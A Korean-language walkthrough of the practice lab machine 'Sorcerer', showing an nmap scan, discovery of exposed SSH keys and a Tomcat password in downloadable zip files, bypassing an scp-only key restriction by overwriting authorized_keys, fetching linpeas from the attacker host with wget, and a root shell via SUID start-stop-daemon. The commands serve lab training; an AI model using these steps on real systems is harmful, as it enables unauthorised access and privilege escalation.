---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/lin/suid
  - tech/lin/sudo-abuse
  - tech/exec/ssh-key
  - tech/enum/dirbust
  - tech/enum/peas
type: machine
platform: pg
os: linux
ip: 192.168.120.100
ports: [22, 80, 111, 2049, 7742, 8080, 33065, 35835, 42329, 43307]
services: [http, mountd, nfs, nlockmgr, rpcbind, ssh]
status: solved
tech_count: 5
---
## Nmap
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Wed Jul  8 17:43:46 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.100
Nmap scan report for 192.168.120.100
Host is up (0.084s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn''t have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      42329/tcp   mountd
|   100005  1,2,3      59704/udp   mountd
|   100021  1,3,4      33065/tcp   nlockmgr
|   100021  1,3,4      51595/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.4
33065/tcp open  nlockmgr 1-4 (RPC #100021)
35835/tcp open  mountd   1-3 (RPC #100005)
42329/tcp open  mountd   1-3 (RPC #100005)
43307/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   84.83 ms 192.168.45.1
2   84.75 ms 192.168.45.254
3   84.93 ms 192.168.251.1
4   85.07 ms 192.168.120.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  8 17:44:17 2026 -- 1 IP address (1 host up) scanned in 31.82 seconds
```

홈페이지 접근 시도
![[Pasted image 20260710131947.png]]

초기 패스워드로 로그인 시도했지만 실패`admin/admin`,`root/root`
![[Pasted image 20260710132020.png]]

feroxbuster로 zipfiles 폴더 발견
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ feroxbuster -u http://192.168.120.100:7742/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.120.100:7742/
 🚩  In-Scope Url          │ 192.168.120.100
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://192.168.120.100:7742/default => http://192.168.120.100:7742/default/
200      GET       65l      117w     1219c http://192.168.120.100:7742/
200      GET       65l      117w     1219c http://192.168.120.100:7742/index.html
200      GET        1l        3w       14c http://192.168.120.100:7742/default/index.html
301      GET        7l       12w      178c http://192.168.120.100:7742/zipfiles => http://192.168.120.100:7742/zipfiles/
200      GET       13l       81w     4749c http://192.168.120.100:7742/zipfiles/francis.zip
200      GET       13l       82w     4741c http://192.168.120.100:7742/zipfiles/miriam.zip
200      GET       39l      203w    13898c http://192.168.120.100:7742/zipfiles/max.zip
200      GET       13l       82w     4733c http://192.168.120.100:7742/zipfiles/sofia.zip
[###########>--------] - 10m   694231/1245789 8m      found:9       errors:0
[###########>--------] - 10m   347193/622887  552/s   http://192.168.120.100:7742/
[###########>--------] - 10m   346902/622887  552/s   http://192.168.120.100:7742/default/
[####################] - 0s    622887/622887  3261188/s http://192.168.120.100:7742/zipfiles/ => Directory listing (add --scan-dir-listings to scan)
```
![[Pasted image 20260710133159.png]]


파일 다운로드 시도
![[Pasted image 20260710132345.png]]

파일 내 .ssh rsa파일 획득
![[Pasted image 20260710132554.png]]


```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ cat authorized_keys
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer    
```

scp_wraaper.sh 확인
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ ls
scp_wrapper.sh  tomcat-users.xml.bak

┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ cat scp_wrapper.sh
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac     
```

tomcat password 획득
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ cat tomcat-users.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->

  <role rolename="manager-gui"/>
  <user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
</tomcat-users>   
```

tomcat ssh 접근 불가
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ ssh tomcat@192.168.120.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tomcat@192.168.120.100: Permission denied (publickey).
```


authorized_keys 파일 수정
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```

scp -O 옵션
![[Pasted image 20260710135852.png]]

authorized_keys 파일 복사
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ scp -O -i id_rsa authorized_keys max@192.168.120.100:/home/max/.ssh/authorized_keys
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
authorized_keys                                                      100%  738     8.0KB/s   00:00

┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```

max 자격증명 획득
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ ssh -i id_rsa max@192.168.120.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Fri Jul 10 00:50:54 2026 from 192.168.45.215
max@sorcerer:~$ whoami
max
```
![[Pasted image 20260710140254.png]]

linpeas.sh 업로드
```bash
max@sorcerer:~$ wget 192.168.45.215/linpeas.sh -O linpeas.sh
--2026-07-10 01:32:27--  http://192.168.45.215/linpeas.sh
Connecting to 192.168.45.215:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 975444 (953K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                100%[====================================>] 952.58K  1.68MB/s    in 0.6s

2026-07-10 01:32:28 (1.68 MB/s) - ‘linpeas.sh’ saved [975444/975444]

max@sorcerer:~$ ls
linpeas.sh  scp_wrapper.sh  tomcat-users.xml.bak
max@sorcerer:~$ ls -al
total 992
drwxr-xr-x 3 max  max    4096 Jul 10 01:32 .
drwxr-xr-x 7 root root   4096 Sep 24  2020 ..
-rw------- 1 max  max       5 Jul 10 00:49 .bash_history
-rw-r--r-- 1 max  max     220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 max  max    3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 max  max  975444 Dec 15  2025 linpeas.sh
-rw-r--r-- 1 max  max     807 Apr 18  2019 .profile
-rwxr-xr-x 1 max  max     133 Sep 24  2020 scp_wrapper.sh
drwx------ 2 max  max    4096 Sep 24  2020 .ssh
-rw-r--r-- 1 max  max    1991 Sep 24  2020 tomcat-users.xml.bak
max@sorcerer:~$ chmod 744 linpeas.sh
```
![[Pasted image 20260710143311.png]]


linpeas 실행 후 /start-stop-daemon 발견
```bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 113K Jun 24  2020 /usr/sbin/mount.nfs
-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 15K Oct  9  2019 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
```


![[Pasted image 20260710150807.png]]

gtfobins 에서 확인
![[Pasted image 20260710151033.png]]

권한 상승 후 flag 확인
```bash
max@sorcerer:/run/systemd$ /usr/sbin/start-stop-daemon -S -x /bin/sh -- -p
# whoami
root
# cat /root/proof.txt
621b7558ae3578abef3e8f4c73485357
```
![[Pasted image 20260710151116.png]]


![[Pasted image 20260710151215.png]]